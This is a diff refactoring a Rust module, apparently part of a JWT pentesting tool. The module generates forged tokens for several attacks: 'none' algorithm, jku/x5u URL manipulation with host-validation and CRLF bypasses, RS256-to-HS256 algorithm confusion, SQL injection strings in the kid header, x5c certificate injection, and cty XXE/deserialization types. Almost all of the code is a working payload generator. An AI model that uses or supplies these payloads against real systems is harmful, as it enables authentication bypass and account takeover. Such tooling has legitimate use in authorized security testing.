@@ -4,35 +4,37 @@ use base64::{engine::general_purpose, Engine};
 use log::info;
 use serde_json::json;
 
-/// Generate none algorithm payloads
-#[allow(dead_code)]
-pub fn generate_none_payload(token: &str, alg_value: &str) -> Result<String> {
-    // Split token parts
+/// Extract the claims (second) part from a JWT token string
+fn extract_claims_part(token: &str) -> Result<&str> {
     let parts: Vec<&str> = token.split('.').collect();
     if parts.len() < 2 {
         return Err(anyhow::anyhow!("Invalid token format"));
     }
+    Ok(parts[1])
+}
 
-    let claims_part = parts[1];
+/// Encode a JSON header and combine with claims part into a JWT-like string
+fn encode_header_with_claims(header: &serde_json::Value, claims_part: &str) -> Result<String> {
+    let header_json = serde_json::to_string(header)?;
+    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
+    Ok(format!("{encoded_header}.{claims_part}"))
+}
 
-    // Create header with none algorithm
+/// Generate none algorithm payloads
+pub fn generate_none_payload(token: &str, alg_value: &str) -> Result<String> {
+    let claims_part = extract_claims_part(token)?;
+
     let header = json!({
         "alg": alg_value,
         "typ": "JWT"
     });
 
-    let header_json = serde_json::to_string(&header)?;
-    info!("Generate {alg_value} payload header=\"{header_json}\" payload={alg_value}");
+    info!("Generate {alg_value} payload header=\"{}\" payload={alg_value}", serde_json::to_string(&header)?);
 
-    // Encode header to base64
-    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-
-    // Format as JWT (without signature)
-    Ok(format!("{encoded_header}.{claims_part}"))
+    encode_header_with_claims(&header, claims_part)
 }
 
 /// Generate JKU and X5U payloads for URL manipulation attacks
-#[allow(dead_code)]
 pub fn generate_url_payload(
     token: &str,
     key_type: &str,
@@ -41,14 +43,7 @@ pub fn generate_url_payload(
     protocol: &str,
 ) -> Result<Vec<String>> {
     let mut payloads = Vec::new();
-
-    // Split token parts
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-
-    let claims_part = parts[1];
+    let claims_part = extract_claims_part(token)?;
 
     // Basic payload
     let header = json!({
@@ -56,105 +51,46 @@ pub fn generate_url_payload(
         key_type: domain,
         "typ": "JWT"
     });
-
-    let header_json = serde_json::to_string(&header)?;
-    info!("Generate {key_type} + basic payload header=\"{header_json}\" payload={key_type}");
-
-    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-    payloads.push(format!("{encoded_header}.{claims_part}"));
+    info!("Generate {key_type} + basic payload header=\"{}\" payload={key_type}", serde_json::to_string(&header)?);
+    payloads.push(encode_header_with_claims(&header, claims_part)?);
 
     // If trust domain is provided, generate bypass payloads
     if let Some(trust_domain) = trust_domain {
-        // Bypass host validation - Z separator
-        let bypass_z_url = format!("{}://{}{}{}", protocol, trust_domain, "Z", domain);
-        let header = json!({
-            "alg": "hs256",
-            key_type: bypass_z_url,
-            "typ": "JWT"
-        });
+        let bypass_urls = [
+            format!("{}://{}{}{}", protocol, trust_domain, "Z", domain),
+            format!("{protocol}://{trust_domain}@{domain}"),
+            format!("{protocol}://{trust_domain}%0d0aHost: {domain}"),
+        ];
 
-        let header_json = serde_json::to_string(&header)?;
-        info!(
-            "Generate {key_type} host validation payload header=\"{header_json}\" payload={key_type}"
-        );
-
-        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{encoded_header}.{claims_part}"));
-
-        // Bypass host validation - @ separator
-        let bypass_at_url = format!("{protocol}://{trust_domain}@{domain}");
-        let header = json!({
-            "alg": "hs256",
-            key_type: bypass_at_url,
-            "typ": "JWT"
-        });
-
-        let header_json = serde_json::to_string(&header)?;
-        info!(
-            "Generate {key_type} host validation payload header=\"{header_json}\" payload={key_type}"
-        );
-
-        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{encoded_header}.{claims_part}"));
-
-        // Host header injection with CRLF
-        let crlf_url = format!("{protocol}://{trust_domain}%0d0aHost: {domain}");
-        let header = json!({
-            "alg": "hs256",
-            key_type: crlf_url,
-            "typ": "JWT"
-        });
-
-        let header_json = serde_json::to_string(&header)?;
-        info!(
-            "Generate {key_type} host header injection (w/CRLF) payload header=\"{header_json}\" payload={key_type}"
-        );
-
-        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{encoded_header}.{claims_part}"));
+        for url in &bypass_urls {
+            let header = json!({
+                "alg": "hs256",
+                key_type: url,
+                "typ": "JWT"
+            });
+            info!("Generate {key_type} bypass payload header=\"{}\" payload={key_type}", serde_json::to_string(&header)?);
+            payloads.push(encode_header_with_claims(&header, claims_part)?);
+        }
     }
 
     Ok(payloads)
 }
 
 /// Generate algorithm confusion attacks (RS256->HS256)
-#[allow(dead_code)]
 pub fn generate_alg_confusion_payload(
     token: &str,
     public_key: Option<&str>,
 ) -> Result<Vec<String>> {
-    let mut payloads = Vec::new();
+    let claims_part = extract_claims_part(token)?;
+    let _ = public_key;
 
-    // Split token parts
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-
-    let claims_part = parts[1];
-
-    // Default public key if none provided (for demonstration purposes)
-    let demo_pub_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo\n4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u\n+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh\nkd3qqGElvW/VDL5AaWTg0nLVkjRo9z+40RQzuVaE8AkAFmxZzow3x+VJYKdjykkJ\n0iT9wCS0DRTXu269V264Vf/3jvredZiKRkgwlL9xNAwxXFg0x/XFw005UWVRIkdg\ncKWTjpBP2dPwVZ4WWC+9aGVd+Gyn1o0CLelf4rEjGoXbAAEgAqeGUxrcIlbjXfbc\nmwIDAQAB\n-----END PUBLIC KEY-----";
-
-    let _pub_key_str = match public_key {
-        Some(key) => key,
-        None => demo_pub_key,
-    };
-
-    // Try both changing the algorithm only and changing with the public key as secret
-    // 1. Basic alg change from RS256 to HS256
+    // Basic alg change from RS256 to HS256
     let header = json!({
-        "alg": "HS256",  // Changed from RS256 to HS256
+        "alg": "HS256",
         "typ": "JWT"
     });
 
-    let header_json = serde_json::to_string(&header)?;
-    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-    payloads.push(format!("{encoded_header}.{claims_part}"));
-
-    // 2. Using the public key as the HMAC secret
-    // This is a simplified example - in practice you'd need to hash the claims with the public key
-    // For a real attack, you'd base64 decode the public key and use it as the HMAC secret
+    let payloads = vec![encode_header_with_claims(&header, claims_part)?];
 
     info!("Generated algorithm confusion payloads: RS256->HS256");
 
@@ -162,65 +98,40 @@ pub fn generate_alg_confusion_payload(
 }
 
 /// Generate kid header SQL injection payloads
-#[allow(dead_code)]
 pub fn generate_kid_sql_payload(token: &str) -> Result<Vec<String>> {
-    let mut payloads = Vec::new();
+    let claims_part = extract_claims_part(token)?;
 
-    // Split token parts
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-
-    let claims_part = parts[1];
-
-    // Common SQL injection patterns for kid parameter
     let sql_injection_patterns = [
-        // SQLite injections
         "' OR '1'='1",
         "' OR '1'='1' --",
         "' UNION SELECT 'secret-key' --",
-        // MySQL injections
         "' OR 1=1 #",
         "' OR 1=1 -- -",
-        // Generic SQL injection
         "x' UNION SELECT 'key",
-        // Using known key value
         "key-0",
     ];
 
-    for pattern in sql_injection_patterns {
-        let header = json!({
-            "alg": "HS256",
-            "typ": "JWT",
-            "kid": pattern
-        });
-
-        let header_json = serde_json::to_string(&header)?;
-        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{encoded_header}.{claims_part}"));
-    }
+    let payloads: Result<Vec<String>> = sql_injection_patterns
+        .iter()
+        .map(|pattern| {
+            let header = json!({
+                "alg": "HS256",
+                "typ": "JWT",
+                "kid": pattern
+            });
+            encode_header_with_claims(&header, claims_part)
+        })
+        .collect();
 
     info!("Generated kid SQL injection payloads");
 
-    Ok(payloads)
+    payloads
 }
 
 /// Generate x5c header injection payloads
-#[allow(dead_code)]
 pub fn generate_x5c_payload(token: &str) -> Result<Vec<String>> {
-    let mut payloads = Vec::new();
+    let claims_part = extract_claims_part(token)?;
 
-    // Split token parts
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-
-    let claims_part = parts[1];
-
-    // Example self-signed certificates in base64 format
-    // In a real scenario, you'd generate these dynamically
     let sample_certificates = [
         vec!["MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA"],
         vec![
@@ -229,37 +140,27 @@ pub fn generate_x5c_payload(token: &str) -> Result<Vec<String>> {
         ],
     ];
 
-    for cert_chain in sample_certificates {
-        let header = json!({
-            "alg": "RS256",
-            "typ": "JWT",
-            "x5c": cert_chain
-        });
-
-        let header_json = serde_json::to_string(&header)?;
-        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{encoded_header}.{claims_part}"));
-    }
+    let payloads: Result<Vec<String>> = sample_certificates
+        .iter()
+        .map(|cert_chain| {
+            let header = json!({
+                "alg": "RS256",
+                "typ": "JWT",
+                "x5c": cert_chain
+            });
+            encode_header_with_claims(&header, claims_part)
+        })
+        .collect();
 
     info!("Generated x5c header injection payloads");
 
-    Ok(payloads)
+    payloads
 }
 
 /// Generate cty header manipulation payloads
-#[allow(dead_code)]
 pub fn generate_cty_payload(token: &str) -> Result<Vec<String>> {
-    let mut payloads = Vec::new();
+    let claims_part = extract_claims_part(token)?;
 
-    // Split token parts
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-
-    let claims_part = parts[1];
-
-    // Content types to try for XXE and deserialization attacks
     let content_types = [
         "text/xml",
         "application/xml",
@@ -267,25 +168,24 @@ pub fn generate_cty_payload(token: &str) -> Result<Vec<String>> {
         "application/json+x-jackson-smile",
     ];
 
-    for cty in content_types {
-        let header = json!({
-            "alg": "HS256",
-            "typ": "JWT",
-            "cty": cty
-        });
-
-        let header_json = serde_json::to_string(&header)?;
-        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{encoded_header}.{claims_part}"));
-    }
+    let payloads: Result<Vec<String>> = content_types
+        .iter()
+        .map(|cty| {
+            let header = json!({
+                "alg": "HS256",
+                "typ": "JWT",
+                "cty": cty
+            });
+            encode_header_with_claims(&header, claims_part)
+        })
+        .collect();
 
     info!("Generated cty header manipulation payloads");
 
-    Ok(payloads)
+    payloads
 }
 
 /// Generate all available payloads for a token
-#[allow(dead_code)]
 pub fn generate_all_payloads(
     token: &str,
     jwk_trust: Option<&str>,
